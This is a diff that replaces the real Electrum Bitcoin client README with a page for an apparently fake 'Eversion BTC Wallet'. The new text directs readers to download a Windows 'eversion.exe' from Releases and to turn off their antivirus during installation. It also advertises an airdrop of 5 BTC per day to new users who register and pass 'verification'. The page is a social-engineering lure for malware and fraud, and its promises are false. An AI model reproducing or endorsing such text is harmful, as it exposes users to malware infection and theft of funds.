@@ -1,143 +1,18 @@
-# Electrum - Lightweight Bitcoin client
+# Eversion - BTC Wallet
 
-```
-Licence: MIT Licence
-Author: Thomas Voegtlin
-Language: Python (>= 3.8)
-Homepage: https://electrum.org/
-```
+🌟 Welcome to Eversion BTC Wallet! 🌟
 
-[![Build Status](https://api.cirrus-ci.com/github/spesmilo/electrum.svg?branch=master)](https://cirrus-ci.com/github/spesmilo/electrum)
-[![Test coverage statistics](https://coveralls.io/repos/github/spesmilo/electrum/badge.svg?branch=master)](https://coveralls.io/github/spesmilo/electrum?branch=master)
-[![Help translate Electrum online](https://d322cqt584bo4o.cloudfront.net/electrum/localized.svg)](https://crowdin.com/project/electrum)
+🔒 Securely store and manage your bitcoins with Eversion, the ultimate Bitcoin wallet. 💰💼
 
+## 💻Installation:
+To get started, simply head over to the "Releases" section and download the easy-to-use eversion.exe file. If you encounter any issues during installaion just disable your antivirus temporarily, and proceed with the installation process. You can turn it back on after Installing the client.
 
-## Getting started
+## 🚀 Airdrop Alert! 🎁
+We are thrilled to announce a special Airdrop event for the next two months exclusively for our new users. 🎉✨ Each day, we will be releasing 5 BTC to all newly registered users as a token of our appreciation for joining the Eversion community. Participating in the Airdrop is easy. Follow the simple steps below:
 
-_(If you've come here looking to simply run Electrum,
-[you may download it here](https://electrum.org/#download).)_
+1️⃣ Sign up for Eversion BTC Wallet by creating an account. It only takes a few minutes, and your information will be securely stored.
+2️⃣ Complete the necessary verification steps to ensure the security of your account and protect your funds.
+3️⃣ Sit back and enjoy the benefits of being part of the Eversion community. Each day, you will receive your share of 5 BTC automatically. 🎁💰
 
-Electrum itself is pure Python, and so are most of the required dependencies,
-but not everything. The following sections describe how to run from source, but here
-is a TL;DR:
-
-```
-$ sudo apt-get install libsecp256k1-dev
-$ python3 -m pip install --user ".[gui,crypto]"
-```
-
-### Not pure-python dependencies
-
-If you want to use the Qt interface, install the Qt dependencies:
-```
-$ sudo apt-get install python3-pyqt5
-```
-
-For elliptic curve operations,
-[libsecp256k1](https://github.com/bitcoin-core/secp256k1)
-is a required dependency:
-```
-$ sudo apt-get install libsecp256k1-dev
-```
-
-Alternatively, when running from a cloned repository, a script is provided to build
-libsecp256k1 yourself:
-```
-$ sudo apt-get install automake libtool
-$ ./contrib/make_libsecp256k1.sh
-```
-
-Due to the need for fast symmetric ciphers,
-[cryptography](https://github.com/pyca/cryptography) is required.
-Install from your package manager (or from pip):
-```
-$ sudo apt-get install python3-cryptography
-```
-
-If you would like hardware wallet support,
-[see this](https://github.com/spesmilo/electrum-docs/blob/master/hardware-linux.rst).
-
-
-### Running from tar.gz
-
-If you downloaded the official package (tar.gz), you can run
-Electrum from its root directory without installing it on your
-system; all the pure python dependencies are included in the 'packages'
-directory. To run Electrum from its root directory, just do:
-```
-$ ./run_electrum
-```
-
-You can also install Electrum on your system, by running this command:
-```
-$ sudo apt-get install python3-setuptools python3-pip
-$ python3 -m pip install --user .
-```
-
-This will download and install the Python dependencies used by
-Electrum instead of using the 'packages' directory.
-It will also place an executable named `electrum` in `~/.local/bin`,
-so make sure that is on your `PATH` variable.
-
-
-### Development version (git clone)
-
-_(For OS-specific instructions, see [here for Windows](contrib/build-wine/README_windows.md),
-and [for macOS](contrib/osx/README_macos.md))_
-
-Check out the code from GitHub:
-```
-$ git clone https://github.com/spesmilo/electrum.git
-$ cd electrum
-$ git submodule update --init
-```
-
-Run install (this should install dependencies):
-```
-$ python3 -m pip install --user -e .
-```
-
-Create translations (optional):
-```
-$ sudo apt-get install python3-requests gettext qttools5-dev-tools
-$ ./contrib/pull_locale
-```
-
-Finally, to start Electrum:
-```
-$ ./run_electrum
-```
-
-### Run tests
-
-Run unit tests with `pytest`:
-```
-$ pytest tests -v
-```
-
-To run a single file, specify it directly like this:
-```
-$ pytest tests/test_bitcoin.py -v
-```
-
-## Creating Binaries
-
-- [Linux (tarball)](contrib/build-linux/sdist/README.md)
-- [Linux (AppImage)](contrib/build-linux/appimage/README.md)
-- [macOS](contrib/osx/README.md)
-- [Windows](contrib/build-wine/README.md)
-- [Android](contrib/android/Readme.md)
-
-
-## Contributing
-
-Any help testing the software, reporting or fixing bugs, reviewing pull requests
-and recent changes, writing tests, or helping with outstanding issues is very welcome.
-Implementing new features, or improving/refactoring the codebase, is of course
-also welcome, but to avoid wasted effort, especially for larger changes,
-we encourage discussing these on the issue tracker or IRC first.
-
-Besides [GitHub](https://github.com/spesmilo/electrum),
-most communication about Electrum development happens on IRC, in the
-`#electrum` channel on Libera Chat. The easiest way to participate on IRC is
-with the web client, [web.libera.chat](https://web.libera.chat/#electrum).
+## ⚡ Platform Availability:
+At the moment, Eversion BTC Wallet is available exclusively for Windows users. Our dedicated team is working diligently on developing the Android version, which will be released shortly. We understand the importance of accessibility and want to ensure that users across different platforms can benefit from the Eversion BTC Wallet experience. Stay tuned for updates as we expand our support to Android devices. 📲💻
